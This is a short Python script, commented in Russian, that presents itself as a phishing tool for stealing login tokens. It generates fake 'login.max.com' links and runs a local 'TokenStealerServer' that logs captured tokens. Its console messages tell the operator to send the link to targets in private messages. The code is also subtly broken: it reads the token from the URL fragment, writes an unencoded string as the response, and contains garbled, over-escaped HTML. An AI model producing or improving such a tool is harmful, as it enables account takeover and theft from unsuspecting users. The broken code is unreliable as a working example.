import http.server
import socketserver
import urllib.parse
import uuid
import random

# Генерация случайного токена
def generate_token():
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))

# Генерация поддельной ссылки (имитация официальной страницы)
def generate_fake_link():
    return f"https://login.max.com/{uuid.uuid4()}?token={generate_token()}"

# Отображение ссылки
print("Генерированная поддельная ссылка:")
print(generate_fake_link())

# Класс сервера, который ворует токены
class TokenStealerServer(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.fragment)

        if 'token' in params:
            token = params['token'][0]
            print("✅ Получен токен:", token)
            print("📝 Токен сохранён в консоль")

            # Отправляем поддельную страницу пользователю
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write("&amp;amp;lt;html&amp;amp;gt;&amp;amp;lt;body&amp;amp;gt;&amp;amp;lt;h1&amp;amp;gt;Токен получен&amp;amp;lt;/h1&amp;amp;gt;&amp;amp;lt;/body&amp;amp;gt;&amp;amp;lt;/html&amp;amp;gt;")
        else:
            self.send_response(404)
            self.send_header("Content-type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write("Токен не найден".encode('utf-8'))  # ✅ Исправлено: добавлен метод .encode('utf-8')

PORT = 8000
with socketserver.TCPServer(("", PORT), TokenStealerServer) as httpd:
    print(f"⚠️ ЛОКАЛЬНЫЙ ФИШИНГ-СЕРВЕР ЗАПУЩЕН НА ПОРТУ {PORT}")
    print("🔗 Откройте браузер и введите: http://localhost:8000")
    print("📧 Отправьте ссылку: https://login.max.com/...?token=... в личные сообщения")
    print("🔑 Токен будет сохранён в консоль")
    httpd.serve_forever()